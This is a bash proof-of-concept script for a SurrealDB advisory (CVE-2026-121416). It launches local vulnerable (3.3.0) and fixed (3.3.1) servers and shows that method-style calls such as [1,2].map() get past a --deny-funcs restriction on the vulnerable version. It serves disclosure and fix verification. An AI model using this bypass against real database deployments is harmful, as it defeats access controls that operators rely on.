#!/usr/bin/env bash
# SurreaSideDoor — SurrealDB --deny-funcs capability bypass via method-style calls
# CVE-2026-121416 / GHSA-p296-7pr4-87rr  (SurrealDB < 3.3.1, fixed in 3.3.1)
#
# Demonstrates, end-to-end against the REAL prebuilt surrealdb binaries:
#   1. v3.3.0 (vulnerable): --deny-funcs array::map is enforced for the NORMAL
#      call form but is BYPASSED by the method form  [1,2].map(|$x| $x*2) -> [2,4]
#   2. v3.3.1 (fixed):      the same method form is now DENIED.
#
# Exit 0 only when BOTH the vulnerable-side bypass AND the fixed-side block are
# observed. Requires the surrealdb release binaries (see README). Set
# SURREAL_BIN_DIR to override their location.
set -u

BIN_DIR="${SURREAL_BIN_DIR:-/home/millie/tools/surreal-bin}"
VULN="$BIN_DIR/surreal-3.3.0"
FIXED="$BIN_DIR/surreal-3.3.1"
AUTH="root:root"
B64AUTH="$(printf '%s' "$AUTH" | base64)"

if [ ! -x "$VULN" ] || [ ! -x "$FIXED" ]; then
  echo "ERROR: surrealdb binaries not found under $BIN_DIR"
  echo "Download them with (see README.md):"
  echo "  curl -sL -o /tmp/s.tgz https://github.com/surrealdb/surrealdb/releases/download/v3.3.0/surreal-v3.3.0.linux-amd64.tgz && tar xzf /tmp/s.tgz && mv surreal surreal-3.3.0"
  exit 3
fi

q() { # q <port> <surql>
  curl -sS --noproxy '*' --max-time 20 -X POST "http://127.0.0.1:$1/sql" \
    -H "Authorization: Basic $B64AUTH" \
    -H "Accept: application/json" -H "Content-Type: text/plain" \
    --data-binary "$2"
}

start_srv() { # start_srv <bin> <port> -> writes pid to SRV
  "$1" start --no-banner -b "127.0.0.1:$2" -u root -p root \
    --deny-funcs array::map >/tmp/opencode/surrealdb-$2.log 2>&1 &
  SRV=$!
  for _ in $(seq 1 60); do
    curl -sS --noproxy '*' -o /dev/null "http://127.0.0.1:$2/health" 2>/dev/null && return 0
    sleep 0.25
  done
  echo "ERROR: server on port $2 did not become ready"
  return 1
}

NORMAL='RETURN array::map([1,2], |$x| $x * 2)'
METHOD='RETURN [1,2].map(|$x| $x * 2)'

PASS=0
FAIL=0
note() { printf '%s\n' "$*"; }

echo "=================================================================="
echo " SurreaSideDoor — deny-funcs method-style bypass (CVE-2026-121416)"
echo "=================================================================="

# ---------- vulnerable 3.3.0 ----------
PORT=8130
note ""
note "[1] vulnerable server v3.3.0  --deny-funcs array::map  (port $PORT)"
start_srv "$VULN" $PORT || { echo "FAIL: server start"; exit 1; }
R_NORMAL="$(q $PORT "$NORMAL")"
R_METHOD="$(q $PORT "$METHOD")"
kill "$SRV" 2>/dev/null; wait "$SRV" 2>/dev/null

note "    normal form : $R_NORMAL"
note "    method form : $R_METHOD"

if echo "$R_NORMAL" | grep -q 'not allowed to be executed'; then
  note "    [ok] normal form is DENIED as configured"
else
  note "    [!!] normal form unexpectedly NOT denied"; FAIL=1
fi
if echo "$R_METHOD" | grep -q '"result":\[2,4\]'; then
  note "    [BYPASS] method form EXECUTED despite deny-funcs -> [2,4]"
  PASS=1
else
  note "    [!!] method form did not produce the expected bypass result"; FAIL=1
fi

# ---------- fixed 3.3.1 ----------
PORT=8131
note ""
note "[2] fixed server v3.3.1  --deny-funcs array::map  (port $PORT)"
start_srv "$FIXED" $PORT || { echo "FAIL: server start"; exit 1; }
F_METHOD="$(q $PORT "$METHOD")"
kill "$SRV" 2>/dev/null; wait "$SRV" 2>/dev/null

note "    method form : $F_METHOD"

if echo "$F_METHOD" | grep -q 'not allowed to be executed'; then
  note "    [fixed] method form is DENIED on v3.3.1"
else
  note "    [!!] fixed version still executes the method form"; FAIL=1
fi

note ""
note "=================================================================="
if [ "$PASS" = 1 ] && [ "$FAIL" = 0 ]; then
  note " RESULT: CONFIRMED — deny-funcs is bypassed by method-style calls"
  note " (v3.3.0 executes [1,2].map() under deny; v3.3.1 blocks it)"
  note "=================================================================="
  exit 0
else
  note " RESULT: NOT CONFIRMED"
  note "=================================================================="
  exit 1
fi
